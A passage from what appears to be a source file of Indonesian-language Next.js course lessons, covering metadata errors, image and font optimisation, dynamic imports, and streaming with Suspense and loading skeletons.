        'Diuji sungguhan dengan Next.js 16, mengekspor `metadata` dari berkas ber-`use client` menghentikan build. Alasannya, metadata harus sudah selesai sebelum halamannya digambar, sedangkan Client Component baru berjalan di peramban. Biarkan halamannya Server Component dan pindahkan bagian interaktifnya ke berkas terpisah.',
      ),

      h2('Saat error-nya muncul'),
      p('Empat kegagalan berikut, yang pertama dijalankan sungguhan dengan Next.js 16.2.12.'),
      code(
        'text',
        `
        'use client';
        export const metadata = { title: 'Halo' };

        You are attempting to export "metadata" from a component marked with
        "use client", which is disallowed. "metadata" must be resolved on the
        server before the page component is rendered.
        `,
        { caption: 'Dijalankan sungguhan. Metadata dari Client Component ditolak.' },
      ),
      p(
        'Pesannya menyebut alasannya sekaligus jalan keluarnya. Ini sering terjadi setelah seseorang menambahkan `use client` ke halaman untuk memakai hook, lalu lupa bahwa metadata di berkas yang sama ikut terkena. Pisahkan bagian interaktifnya menjadi komponen terpisah, dan biarkan halamannya tetap Server Component.',
      ),
      code(
        'text',
        `
        # Seribu halaman produk, seluruhnya berjudul "Toko Kami".

        # Tidak ada error. Metadata hanya ditulis di layout akar.
        `,
        { caption: 'Metadata tidak disesuaikan per halaman.' },
      ),
      p(
        'Tidak ada error, dan akibatnya berupa halaman yang tidak bisa dibedakan mesin pencari. Judul adalah faktor yang paling langsung mempengaruhi apakah orang mengklik hasil pencarian, dan seribu halaman berjudul sama praktis bersaing satu sama lain. Cara memeriksanya cepat, yaitu buka View Source lalu cari tag judulnya.',
      ),
      code(
        'text',
        `
        openGraph: { images: ['/gambar/produk-7.jpg'] }
        # tanpa metadataBase

        # Sebagian platform gagal menampilkan gambar,
        # sebab alamatnya relatif dan mereka butuh alamat lengkap.
        `,
        { caption: 'Alamat relatif pada metadata yang dibaca layanan luar.' },
      ),
      p(
        'Layanan yang membaca metadata berada di luar situsmu, sehingga alamat relatif tidak berarti apa-apa bagi mereka. Menyetel `metadataBase` di layout akar membuat Next.js mengubah seluruh alamat relatif menjadi lengkap secara otomatis. Tanpa itu, kamu harus menulis alamat lengkap di setiap tempat dan satu yang terlewat berarti gambar yang tidak muncul.',
      ),
      code(
        'text',
        `
        export async function generateMetadata({ params }) {
          const produk = await ambilProduk((await params).id);
          return { title: produk.nama };
        }

        TypeError: Cannot read properties of null (reading 'nama')
        `,
        { caption: 'Produk tidak ada, dan hasilnya tidak diperiksa.' },
      ),
      p(
        'Fungsi metadata berjalan sebelum komponen halamannya, sehingga `notFound()` di komponen belum sempat dipanggil. Kalau produknya tidak ada, `generateMetadata` yang lebih dulu gagal. Periksa hasilnya dan kembalikan metadata untuk halaman tidak ditemukan, seperti pada studi kasus.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`attempting to export "metadata" from a component marked with "use client"`',
            'Metadata di Client Component',
            'Biarkan halamannya Server Component, pisahkan bagian interaktifnya',
          ],
          [
            'Seluruh halaman berjudul sama',
            'Metadata hanya di layout akar',
            'Tambahkan `generateMetadata` per halaman dinamis',
          ],
          [
            'Gambar tidak muncul saat tautan dibagikan',
            'Alamat relatif tanpa `metadataBase`',
            'Setel `metadataBase` di layout akar',
          ],
          [
            '`Cannot read properties of null` di `generateMetadata`',
            'Hasil pengambilan data tidak diperiksa',
            'Kembalikan metadata khusus untuk halaman tidak ditemukan',
          ],
          [
            'Dua alamat bersaing di hasil pencarian',
            'Tidak ada penanda alamat utama',
            'Setel `alternates.canonical`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Metadata sering dianggap penyempurnaan yang bisa ditunda, padahal ia yang menentukan bagaimana halamanmu terlihat di luar situsmu.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menulis metadata hanya di layout akar',
            'Sudah ada judulnya',
            'Seluruh halaman berjudul sama dan tidak bisa dibedakan mesin pencari',
          ],
          [
            'Melupakan `openGraph`',
            'Yang penting terbaca mesin pencari',
            'Tautan yang dibagikan ke media sosial dan aplikasi pesan tampil tanpa gambar maupun judul',
          ],
          [
            'Memakai alamat relatif tanpa `metadataBase`',
            'Alamatnya kan sudah benar',
            'Layanan di luar situsmu tidak bisa mengubahnya menjadi lengkap',
          ],
          [
            'Menulis deskripsi yang sangat panjang',
            'Semakin lengkap semakin baik',
            'Mesin pencari memotongnya sekitar 155 karakter. Tulis yang penting di depan',
          ],
          [
            'Tidak menangani halaman yang datanya tidak ada',
            'Halamannya kan akan 404',
            '`generateMetadata` berjalan lebih dulu dan gagal sebelum `notFound()` sempat dipanggil',
          ],
          [
            'Menambahkan `use client` ke halaman yang punya metadata',
            'Butuh satu hook saja',
            'Build gagal. Pisahkan bagian interaktifnya ke komponen terpisah',
          ],
        ],
      ),
      p(
        'Baris kedua sering baru disadari setelah ada yang membagikan tautan produk ke grup pesan dan hasilnya hanya alamat mentah. Bagian `openGraph` tidak mempengaruhi peringkat pencarian sama sekali, dan ia sangat mempengaruhi berapa orang yang mengklik tautan yang dibagikan. Untuk toko daring, itu jalur masuk yang nyata.',
      ),
      callout(
        'tip',
        'Periksa hasilnya dengan alat resmi platformnya',
        'Buka View Source dan cari tag `meta` untuk memastikan nilainya benar-benar ada. Untuk pratinjau tautan, sebagian besar platform besar menyediakan alat pemeriksa yang menampilkan bagaimana tautanmu akan tampil beserta masalah yang mereka temukan. Memeriksanya sekali jauh lebih cepat daripada membagikan tautan berulang kali untuk melihat hasilnya.',
      ),
      references(
        {
          label: 'Metadata and OG images',
          href: 'https://nextjs.org/docs/app/getting-started/metadata-and-og-images',
          source: 'Next.js',
          note: 'Metadata statis, `generateMetadata`, dan berkas metadata berbasis konvensi.',
        },
        {
          label: 'generateMetadata — daftar field lengkap',
          href: 'https://nextjs.org/docs/app/api-reference/functions/generate-metadata',
          source: 'Next.js',
          note: 'Termasuk `openGraph`, `twitter`, `robots`, dan pola `template` pada judul.',
        },
        {
          label: 'ImageResponse',
          href: 'https://nextjs.org/docs/app/api-reference/functions/image-response',
          source: 'Next.js',
          note: 'Membuat gambar Open Graph dari JSX, satu per halaman.',
        },
        {
          label: '<meta>: the metadata element',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta',
          source: 'MDN Web Docs',
          note: 'Tag yang sebenarnya dihasilkan objek `metadata` — termasuk `name="robots"` dan properti Open Graph.',
        },
      ),
    ],
  ),

  written(
    'optimasi-next',
    'Optimasi: `next/image`, `next/font`, dynamic import',
    22,
    'Fitur bawaan yang langsung berdampak pada Core Web Vitals.',
    [
      p(
        'Tiga fitur bawaan Next.js yang menangani tiga penyebab paling umum halaman lambat: gambar, font, dan JavaScript yang tidak perlu diunduh sekarang.',
      ),

      terms(
        {
          term: 'Core Web Vitals',
          meaning:
            'Tiga metrik pengalaman pengguna yang diukur Google: **LCP** (kapan konten utama muncul, target < 2,5 detik), **INP** (seberapa cepat halaman merespons interaksi, < 200ms), dan **CLS** (seberapa banyak tata letak bergeser, < 0,1). Tiga fitur di sub-bab ini menyerang tiga penyebab terbesarnya.',
        },
        {
          term: 'LCP',
          meaning:
            'Singkatan *Largest Contentful Paint* — kapan elemen terbesar di layar pertama selesai digambar. Biasanya sebuah gambar sampul atau judul besar. Prop `priority` pada `next/image` hanya untuk elemen ini; menaburkannya ke gambar lain justru memperlambat.',
        },
        {
          term: 'lazy-load',
          meaning:
            'Menunda pengunduhan sesuatu sampai benar-benar dibutuhkan — biasanya sampai ia hampir terlihat di layar. `next/image` melakukannya **otomatis** untuk semua gambar kecuali yang bertanda `priority`.',
        },
        {
          term: 'srcset',
          meaning:
            'Atribut HTML berisi beberapa versi ukuran sebuah gambar, sehingga browser memilih yang paling pas untuk layarnya. `next/image` menghasilkannya otomatis — inilah yang mencegah ponsel mengunduh gambar seukuran monitor.',
        },
        {
          term: 'WebP / AVIF',
          meaning:
            'Dua format gambar modern yang jauh lebih kecil daripada JPEG dan PNG pada kualitas setara. `next/image` mengubah ke format ini bila browser mendukungnya, dan tetap menyajikan format lama bila tidak.',
        },
        {
          term: 'remotePatterns',
          meaning:
            'Allow-list domain gambar eksternal di `next.config`. Ini bukan cuma konfigurasi melainkan **penjagaan**: tanpa daftar ini, endpoint optimasi gambarmu bisa dipakai orang lain untuk memproses gambar sembarangan atas biaya servermu.',
        },
        {
          term: 'font-display: swap',
          meaning:
            'Instruksi agar browser menampilkan teks dengan font cadangan **lebih dulu**, lalu menukarnya begitu font aslinya siap. Alternatifnya adalah teks tak terlihat selama font diunduh — kegagalan yang jauh lebih terasa daripada pergantian font sesaat.',
        },
        {
          term: 'next/font/local',
          meaning:
            'Memuat font dari berkas di dalam repo. Website ini memakainya setelah `next/font/google`, yang mengunduh font **saat build**, membuat `npm run build` gagal ketika Google tidak bisa dihubungi, pada kode yang tidak berubah sama sekali. Alasannya tercatat di ADR-0005.',
        },
        {
          term: 'dynamic import',
          meaning:
            'Memuat sebuah modul **saat dibutuhkan**, bukan di bundle awal. Berbayar untuk hal besar yang tidak semua orang buka: editor kode, grafik, peta, 3D. Untuk komponen kecil justru merugi — biaya permintaan tambahannya lebih besar daripada yang dihemat.',
        },
        {
          term: 'ssr: false',
          meaning:
            'Opsi `dynamic()` yang berarti "jangan render ini di server sama sekali". Dipakai untuk library yang butuh `window`. Konsekuensinya: komponen itu baru muncul setelah JavaScript aktif, jadi sediakan `loading` yang memesan ruang.',
        },
      ),

      h2('`next/image`'),
      code(
        'tsx',
        `
        import Image from 'next/image';

        <Image
          src="/sampul.jpg"
          alt="Sampul materi React"
          width={1200}
          height={630}
          // Hanya untuk gambar yang menjadi elemen LCP — jangan ditaburkan.
          priority
        />
        `,
      ),
      p('Yang ia kerjakan otomatis:'),
      ul(
        'Mengubah ke WebP/AVIF bila browser mendukungnya.',
        'Menghasilkan beberapa ukuran dan memilihnya lewat `srcset`.',
        'Lazy-load semua gambar kecuali yang bertanda `priority`.',
        '**Memesan ruang** dari `width`/`height` sehingga tidak ada layout shift.',
      ),
      callout(
        'danger',
        'Kenapa `width` dan `height` wajib',
        'Tanpa dimensi, browser tidak tahu berapa ruang yang harus disiapkan. Teks di bawah gambar melompat begitu gambarnya dimuat — itu Cumulative Layout Shift, dan ia adalah penyebab paling umum CLS buruk. Untuk gambar yang ukurannya tidak diketahui, pakai `fill` dengan induk ber-`position: relative` dan aspect-ratio yang ditetapkan.',
      ),
      code(
        'ts',
        `
        // Gambar dari domain lain harus di-allow-list dulu.
        // Ini juga penjagaan: tanpa daftar ini, endpoint optimasi gambarmu
        // bisa dipakai orang lain untuk memproses gambar sembarangan.
        const nextConfig = {
          images: {
            remotePatterns: [{ protocol: 'https', hostname: 'cdn.contoh.com', pathname: '/gambar/**' }],
          },
        };
        `,
      ),

      h2('`next/font`'),
      code(
        'tsx',
        `
        import localFont from 'next/font/local';

        const sans = localFont({
          src: './fonts/instrument-sans.woff2',
          weight: '400 700',
          display: 'swap',
          variable: '--font-sans',
        });

        export default function RootLayout({ children }) {
          return (
            <html className={sans.variable}>
              <body>{children}</body>
            </html>
          );
        }
        `,
      ),
      p(
        'Font disajikan dari origin sendiri — tidak ada permintaan ke pihak ketiga saat halaman dibuka, tidak ada DNS lookup tambahan, dan tidak ada stylesheet yang memblokir render.',
      ),
      callout(
        'tip',
        'Pelajaran dari website ini',
        'Website ini semula memakai `next/font/google`, yang mengunduh font **saat build**. Ketika Google Fonts tidak bisa dihubungi, `npm run build` gagal pada kode yang tidak berubah sama sekali. Berkas font-nya sekarang disimpan di dalam repo dan dimuat dengan `next/font/local`, sehingga build tidak lagi bergantung pada uptime pihak lain. Alasannya tercatat di ADR-0005.',
      ),

      h2('Dynamic import'),
      code(
        'tsx',
        `
        import dynamic from 'next/dynamic';

        // Editor kode berukuran ratusan KB. Tidak semua pembaca membukanya,
        // jadi ia tidak perlu ikut di bundle awal.
        const Playground = dynamic(() => import('@/components/playground'), {
          loading: () => <SkeletonPlayground />,
          ssr: false,   // library ini butuh window
        });
        `,
      ),
      p(
        'Website ini memuat Sandpack (playground kode) dengan cara ini. Halaman yang tidak punya playground tidak membayar biayanya sama sekali.',
      ),

      h2('Kandidat yang layak di-dynamic-import'),
      table(
        ['Layak', 'Tidak layak'],
        [
          ['Editor kode, grafik, peta, 3D', 'Tombol, kartu, komponen kecil'],
          ['Isi modal yang jarang dibuka', 'Apa pun di layar pertama'],
          ['Tab yang tidak aktif saat muat', 'Navigasi'],
          ['Library yang > 50 KB', 'Library kecil (loading-nya jadi lebih mahal)'],
        ],
      ),

      h2('Menganalisis bundle'),
      code(
        'bash',
        `
        npm run build
        `,
      ),
      p(
        'Keluaran build menampilkan ukuran First Load JS per rute. Angka yang melonjak tiba-tiba di satu rute hampir selalu berarti satu impor yang tidak sengaja menarik sesuatu yang besar — persis seperti kebocoran kurikulum yang dibahas di Bab 6.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman beranda toko memuat dua belas gambar produk, satu font kustom, dan satu pustaka grafik. Diukur di ponsel kelas menengah dengan jaringan lambat, halamannya butuh lebih dari empat detik sebelum gambar utamanya tampil, dan isi halaman melompat tiga kali saat gambar-gambarnya selesai dimuat. Ketiga masalah punya jawaban bawaan di Next.js yang tidak butuh satu pun pustaka tambahan.',
      ),
      code(
        'tsx',
        `
        import Image from 'next/image';

        export function KartuProduk({ produk, utama }: Props) {
          return (
            <article>
              <Image
                src={produk.gambarUrl}
                alt={produk.nama}
                width={400}
                height={400}
                // priority HANYA untuk gambar yang terlihat pertama tanpa menggulir.
                priority={utama}
                // sizes memberi tahu peramban lebar sungguhannya per lebar layar,
                // supaya ia mengunduh berkas yang tepat, bukan yang terbesar.
                sizes="(max-width: 640px) 100vw, (max-width: 1024px) 50vw, 400px"
              />
              <h3>{produk.nama}</h3>
            </article>
          );
        }
        `,
        { filename: 'src/produk/KartuProduk.tsx' },
      ),
      p(
        'Atribut `width` dan `height` bukan ukuran tampilnya melainkan **perbandingan sisinya**, dan itu yang mencegah pergeseran tata letak. Peramban memakainya untuk menyediakan ruang sebelum gambarnya terunduh. Ini masalah yang sudah diukur di Bab 4 Frontend Basic, dan di sini komponennya mewajibkan keduanya sehingga sulit lupa.',
      ),
      p(
        'Atribut `sizes` sering dilewatkan dan dampaknya besar pada jaringan lambat. Tanpa itu, peramban tidak tahu seberapa lebar gambarnya akan tampil sehingga sering mengunduh berkas yang jauh lebih besar dari yang diperlukan. Untuk dua belas kartu di ponsel, selisihnya bisa ratusan kilobyte.',
      ),
      p(
        'Atribut `priority` menandai gambar yang menjadi elemen terbesar pertama, dan ia harus dipakai **hemat**. Menandai seluruh dua belas gambar sebagai prioritas berarti tidak ada yang prioritas, sebab semuanya berebut bandwidth di awal. Biasanya hanya satu gambar per halaman yang layak, yaitu yang terlihat tanpa menggulir.',
      ),
      code(
        'tsx',
        `
        // Font: berkasnya disimpan DI REPO, bukan diunduh saat build.
        import localFont from 'next/font/local';

        const inter = localFont({
          src: './fonts/inter.woff2',
          display: 'swap',       // teks tampil dengan font cadangan dulu, bukan kosong
          variable: '--font-inter',
        });

        export default function RootLayout({ children }: { children: React.ReactNode }) {
          return (
            <html lang="id" className={inter.variable}>
              <body>{children}</body>
            </html>
          );
        }
        `,
        { filename: 'app/layout.tsx' },
      ),
      p(
        "Berkas fontnya disimpan di dalam repo lalu disajikan dari domainmu sendiri, sehingga tidak ada permintaan ke server pihak ketiga dan tidak ada penundaan pencarian nama domain. Website ini memakai bentuk itu dengan sengaja setelah `next/font/google` pernah membuat build gagal, dan punya test yang menolak impor itu di seluruh kode. Nilai `display: 'swap'` membuat teks tampil dengan font cadangan lebih dulu alih-alih kosong, dan itu perbedaan besar di jaringan lambat.",
      ),
      code(
        'tsx',
        `
        // Pustaka berat: muat hanya saat benar-benar dipakai.
        import dynamic from 'next/dynamic';

        const Grafik = dynamic(() => import('./Grafik'), {
          loading: () => <div className="skeleton" style={{ height: 300 }} />,
          ssr: false,      // grafik butuh DOM, jadi tidak perlu dirender di server
        });

        export function Dasbor({ data }: Props) {
          const [tampilkan, setTampilkan] = useState(false);
          return (
            <>
              <button onClick={() => setTampilkan(true)}>Tampilkan grafik</button>
              {tampilkan ? <Grafik data={data} /> : null}
            </>
          );
        }
        `,
        { caption: 'Pustaka grafiknya tidak ikut di bundel awal.' },
      ),
      callout(
        'warning',
        'Ukur di perangkat yang mirip milik pengguna',
        'Angka di mesin pengembangan hampir selalu jauh lebih baik daripada kenyataan. Tab Performance menyediakan pembatas CPU dan jaringan, dan memakainya membuat masalah performa terlihat sebelum pengguna menemukannya. Baseline project ini menuntut LCP di bawah 2,5 detik dan CLS di bawah 0,1, dan keduanya diukur pada kondisi itu.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut adalah yang paling sering, dan sebagian besarnya berupa peringatan bukan error.',
      ),
      code(
        'text',
        `
        <Image src={produk.gambarUrl} alt={produk.nama} />

        Error: Image is missing required "width" property.
        `,
        { caption: 'Komponen gambar mewajibkan ukurannya disebutkan.' },
      ),
      p(
        'Kewajiban ini disengaja, sebab tanpa ukuran peramban tidak bisa menyediakan ruang dan tata letaknya melompat. Kalau ukurannya memang tidak diketahui, ada prop `fill` yang membuat gambarnya mengisi wadah dengan posisi relatif. Yang tidak disediakan adalah cara merender gambar tanpa informasi ukuran sama sekali, dan itu memang batas yang benar.',
      ),
      code(
        'text',
        `
        <Image src="https://cdn-lain.com/foto.jpg" ... />

        Error: Invalid src prop on \`next/image\`, hostname "cdn-lain.com" is not
        configured under images in your \`next.config.js\`
        `,
        { caption: 'Domain gambar luar belum diizinkan.' },
      ),
      p(
        'Ini penjaga yang disengaja, sebab tanpa daftar izin siapa pun bisa memakai server pengoptimalan gambarmu untuk memproses gambar dari mana saja. Perbaikannya menambahkan domainnya ke `images.remotePatterns` di konfigurasi. Yang tidak dianjurkan adalah mengizinkan seluruh domain, sebab itu membuka penyalahgunaan yang biayanya kamu yang tanggung.',
      ),
      code(
        'text',
        `
        # Dua belas gambar semuanya diberi priority.

        # Tidak ada error. Seluruhnya berebut bandwidth di awal,
        # dan gambar utamanya justru tampil lebih lambat.
        `,
        { caption: 'Prioritas diberikan ke terlalu banyak gambar.' },
      ),
      p(
        'Menandai semuanya sebagai prioritas sama dengan tidak menandai apa pun, dan hasilnya justru lebih buruk sebab bandwidth terbagi. Peringatan bisa muncul di console kalau terlalu banyak, dan gejalanya berupa skor LCP yang tidak membaik walaupun `priority` sudah dipakai. Pilih satu gambar per halaman, yaitu yang terlihat pertama tanpa menggulir.',
      ),
      code(
        'text',
        `
        const Grafik = dynamic(() => import('./Grafik'), { ssr: false });
        # dipakai di Server Component

        Error: \`ssr: false\` is not allowed with next/dynamic in Server Components.
        `,
        { caption: 'Opsi khusus klien dipakai di Server Component.' },
      ),
      p(
        'Opsi `ssr: false` berarti komponennya sengaja tidak dirender di server, dan itu keputusan yang hanya berarti di Client Component. Perbaikannya memindahkan pemanggilan `dynamic` ke berkas ber-`use client`, atau menghapus opsi itu kalau komponennya memang bisa dirender di server.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`Image is missing required "width" property`',
            'Ukuran gambar tidak disebutkan',
            'Tambahkan `width` dan `height`, atau pakai `fill`',
          ],
          [
            '`hostname ... is not configured under images`',
            'Domain gambar luar belum diizinkan',
            'Tambahkan ke `images.remotePatterns`, jangan izinkan semua domain',
          ],
          [
            'Skor LCP tidak membaik walau `priority` dipakai',
            'Terlalu banyak gambar diberi prioritas',
            'Pilih satu gambar per halaman',
          ],
          [
            '`ssr: false is not allowed ... in Server Components`',
            'Opsi khusus klien dipakai di Server Component',
            'Pindahkan ke berkas ber-`use client`',
          ],
          [
            'Teks tidak terlihat selama beberapa detik',
            "Font dimuat tanpa `display: \\'swap\\'`",
            'Tambahkan opsinya supaya font cadangan dipakai lebih dulu',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Pengoptimalan bawaan Next.js banyak, dan sebagian besar kesalahan berasal dari memakainya setengah atau memakainya untuk semuanya.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Melupakan `sizes` pada gambar responsif',
            'Ukurannya sudah disebutkan',
            'Peramban mengunduh berkas yang jauh lebih besar dari yang tampil. Di ponsel selisihnya ratusan kilobyte',
          ],
          [
            'Memberi `priority` ke seluruh gambar',
            'Semuanya penting',
            'Bandwidth terbagi dan gambar utamanya justru lebih lambat. Pilih satu',
          ],
          [
            'Memakai tag `img` biasa untuk menghindari konfigurasi',
            'Lebih sederhana',
            'Kehilangan pengubahan ukuran otomatis, format modern, dan pemuatan malas. Untuk satu ikon itu wajar, untuk foto produk tidak',
          ],
          [
            'Memuat font dari server pihak ketiga',
            'Cukup satu tag',
            'Menambah pencarian nama domain dan permintaan ke server lain. Muat lewat `next/font` supaya disajikan dari domainmu',
          ],
          [
            'Membungkus seluruh komponen dengan `dynamic`',
            'Supaya bundelnya kecil',
            'Tiap pemuatan tertunda menambah jeda. Pakai untuk yang benar-benar berat dan tidak selalu dipakai',
          ],
          [
            'Mengukur performa hanya di mesin sendiri',
            'Angkanya nyata',
            'Mesin pengembangan jauh lebih cepat. Pakai pembatas CPU dan jaringan di tab Performance',
          ],
        ],
      ),
      p(
        'Baris ketiga perlu diseimbangkan supaya tidak dibaca terlalu keras. Untuk ikon kecil, gambar dekoratif, dan SVG, tag `img` biasa sepenuhnya wajar dan komponen gambar justru menambah kerumitan. Yang benar-benar diuntungkan adalah foto berukuran besar yang tampil di banyak ukuran layar, dan di sana selisihnya bisa sangat besar.',
      ),
      callout(
        'tip',
        'Urutan memperbaiki halaman yang lambat',
        'Rekam di tab Performance dengan pembatas CPU dan jaringan lebih dulu, lalu lihat apa yang benar-benar memakan waktu. Kalau habis di gambar, perbaiki `sizes` dan `priority`. Kalau habis di JavaScript, periksa letak `use client` dan pertimbangkan `dynamic`. Kalau habis menunggu server, periksa apakah permintaannya berurutan. Menebak urutan ini hampir selalu salah.',
      ),
      references(
        {
          label: 'Image Optimization',
          href: 'https://nextjs.org/docs/app/api-reference/components/image',
          source: 'Next.js',
          note: 'Prop `width`/`height`/`fill`/`priority` dan alasan masing-masing wajib atau tidak.',
        },
        {
          label: 'Font Optimization',
          href: 'https://nextjs.org/docs/app/api-reference/components/font',
          source: 'Next.js',
          note: 'Bentuk `next/font/local` yang dipakai website ini setelah pindah dari Google Fonts.',
        },
        {
          label: 'Lazy Loading (next/dynamic)',
          href: 'https://nextjs.org/docs/app/guides/lazy-loading',
          source: 'Next.js',
          note: 'Opsi `loading` dan `ssr: false`, beserta kapan dynamic import justru merugi.',
        },
        {
          label: 'Largest Contentful Paint (LCP)',
          href: 'https://web.dev/articles/lcp',
          source: 'web.dev',
          note: 'Definisi metrik yang menentukan gambar mana yang pantas diberi `priority`.',
        },
      ),
    ],
  ),

  written(
    'loading-streaming',
    'Loading UI, Streaming & Suspense',
    20,
    'Menampilkan bagian yang siap lebih dulu.',
    [
      p(
        'Tanpa streaming, server menunggu **seluruh** halaman selesai, termasuk query paling lambat, sebelum mengirim apa pun. Dengan streaming, HTML dikirim bertahap, sehingga yang siap duluan tampil duluan.',
      ),

      terms(
        {
          term: 'streaming',
          meaning:
            'Mengirim HTML **bertahap** alih-alih sekaligus. Tanpanya, server menunggu seluruh halaman selesai, termasuk query paling lambat, sebelum mengirim apa pun. Dengan streaming, yang siap duluan tampil duluan.',
        },
        {
          term: 'loading.tsx',
          meaning:
            'Berkas konvensi yang **otomatis** membungkus `page.tsx` sesegmen dengan `<Suspense>`. Kamu tidak menulis `<Suspense>` sendiri — cukup buat berkasnya, dan layout di atasnya tetap terlihat selama isinya dimuat.',
        },
        {
          term: 'Suspense',
          meaning:
            'Komponen React yang menampilkan `fallback` selama anak-anaknya belum siap. Dipakai langsung ketika kamu butuh kontrol lebih halus daripada `loading.tsx`: beberapa bagian halaman dengan penantian yang berbeda-beda.',
        },
        {
          term: 'batas Suspense',
          meaning:
            'Kesalahan paling sering di sub-bab ini. `<Suspense>` **hanya bekerja kalau penantiannya terjadi di dalamnya**. Membungkus komponen yang datanya sudah di-`await` di induknya tidak melakukan apa-apa — fallback-nya bahkan tidak pernah terlihat.',
        },
        {
          term: 'skeleton',
          meaning:
            'Kerangka abu-abu berbentuk konten yang akan muncul. Fungsinya bukan hiasan: ia **memesan ruang**. Spinner 24px yang digantikan tabel setinggi 600px membuat seluruh halaman melompat.',
        },
        {
          term: 'animate-pulse',
          meaning:
            'Kelas Tailwind yang memberi efek berdenyut lembut pada skeleton. Ia menandakan "sedang berjalan, bukan macet" — dan karena hanya mengubah opacity, ia tidak membebani rendering.',
        },
        {
          term: 'progressive rendering',
          meaning:
            'Nama umum untuk perilaku yang dihasilkan streaming: pengguna melihat navigasi dan kerangka halaman seketika, lalu bagian-bagian isinya berdatangan. Ini menukar "semua sekaligus, lambat" dengan "sebagian cepat, sisanya menyusul".',
        },
        {
          term: 'CLS',
          meaning:
            'Singkatan *Cumulative Layout Shift* — seberapa banyak konten bergeser tanpa diminta pengguna. Inilah alasan skeleton harus menyerupai tinggi isi aslinya. Bukan urusan estetika: ia metrik yang dinilai mesin pencari **dan** dirasakan sebagai kekacauan.',
        },
      ),

      h2('`loading.tsx`'),
      code(
        'tsx',
        `
        // app/kelas/loading.tsx
        // Otomatis membungkus page.tsx sesegmen dengan <Suspense>.
        export default function Memuat() {
          return (
            <div className="space-y-4">
              {Array.from({ length: 6 }).map((_, i) => (
                <div key={i} className="h-24 animate-pulse rounded-lg bg-surface" />
              ))}
            </div>
          );
        }
        `,
      ),
      p(
        'Layout di atasnya tetap terlihat selama ini. Pengguna melihat navigasi dan kerangka halaman seketika, bukan layar putih.',
      ),

      h2('`<Suspense>` untuk kontrol lebih halus'),
      code(
        'tsx',
        `
        export default async function Dasbor() {
          return (
            <>
              {/* Cepat: tampil segera */}
              <Ringkasan />

              {/* Lambat: masing-masing menyusul sendiri */}
              <Suspense fallback={<SkeletonGrafik />}>
                <GrafikPendapatan />
              </Suspense>

              <Suspense fallback={<SkeletonTabel />}>
                <TabelTransaksi />
              </Suspense>
            </>
          );
        }
        `,
      ),
      p(
        'Grafik yang butuh 2 detik tidak menahan tabel yang butuh 200ms. Keduanya muncul begitu siap masing-masing.',
      ),

      h2('Letakkan `await` di dalam komponen yang di-Suspense'),
      compare(
        {
          title: 'Suspense tidak berguna',
          lang: 'tsx',
          code: `
          export default async function Dasbor() {
            // Ditunggu SEBELUM apa pun dirender.
            const data = await ambilLambat();

            return (
              <Suspense fallback={<Skeleton />}>
                <Grafik data={data} />
              </Suspense>
            );
          }
          `,
          notes: ['Halaman tetap menunggu penuh', 'Fallback tidak pernah terlihat'],
        },
        {
          title: 'Suspense bekerja',
          lang: 'tsx',
          code: `
          export default function Dasbor() {
            return (
              <Suspense fallback={<Skeleton />}>
                <Grafik />
              </Suspense>
            );
          }

          async function Grafik() {
            const data = await ambilLambat();
            return <Chart data={data} />;
          }
          `,
          notes: ['await berada DI DALAM batas Suspense', 'Sisa halaman terkirim duluan'],
        },
      ),
      p(
        'Kedua kolom memakai `<Suspense>` dengan `fallback` yang sama, jadi perbedaannya bukan pada Suspense-nya melainkan pada **letak `await`-nya**. Di kolom kiri, `await ambilLambat()` berada di `Dasbor`, yaitu komponen yang **membungkus** batas Suspense. Karena itu Next.js harus menunggu data selesai sebelum bisa merender apa pun, termasuk `<Suspense>` itu sendiri, sehingga fallback-nya tidak pernah sempat terlihat, dan halamannya tetap tertahan penuh. Kolom kanan memindahkan penantian itu ke `Grafik`, yaitu komponen **di dalam** batasnya. Sekarang `Dasbor` tidak menunggu apa pun, jadi ia bisa dikirim seketika bersama skeleton, dan grafiknya menyusul saat datanya siap. Aturan yang bisa dibawa adalah `Suspense` tidak menunda apa pun, sebab ia hanya menandai **batas** tempat penantian boleh terjadi, dan penantiannya harus ada di dalam batas itu.',
      ),
      callout(
        'warning',
        'Ini kesalahan yang paling sering',
        'Menaruh `<Suspense>` di sekitar komponen yang datanya sudah di-`await` di induknya tidak melakukan apa-apa. Batas Suspense hanya bekerja kalau penantiannya terjadi **di dalamnya**.',
      ),

      h2('Skeleton harus menyerupai isi aslinya'),
      callout(
        'danger',
        'Fallback kecil merusak CLS',
        'Spinner 24px yang digantikan tabel setinggi 600px membuat seluruh halaman melompat. Buat skeleton dengan tinggi dan bentuk yang mendekati isi sebenarnya. Ini bukan urusan estetika — Cumulative Layout Shift adalah metrik yang dinilai dan dirasakan.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman dasbor mengambil empat sumber data, yaitu ringkasan penjualan yang cepat, grafik tren yang butuh dua detik, daftar pesanan terbaru, dan rekomendasi dari layanan pihak ketiga yang kadang lambat. Ditulis dengan satu `await` untuk semuanya, pengguna melihat layar kosong sampai yang paling lambat selesai. Empat sumber, dan yang menentukan waktu tunggu hanya yang terburuk.',
      ),
      p(
        'Streaming membalik itu. Bagian yang sudah siap dikirim lebih dulu, dan bagian yang lambat menyusul tanpa menahan yang lain.',
      ),
      code(
        'tsx',
        `
        import { Suspense } from 'react';

        export default async function Dasbor() {
          // Data cepat: ditunggu, sebab ia menentukan kerangka halaman.
          const ringkasan = await ambilRingkasan();

          return (
            <>
              <KartuRingkasan data={ringkasan} />

              {/* Tiap bagian lambat dibungkus Suspense sendiri.
                  Yang selesai lebih dulu tampil lebih dulu. */}
              <Suspense fallback={<SkeletonGrafik />}>
                <GrafikTren />
              </Suspense>

              <Suspense fallback={<SkeletonDaftar baris={5} />}>
                <PesananTerbaru />
              </Suspense>

              <Suspense fallback={<SkeletonKartu />}>
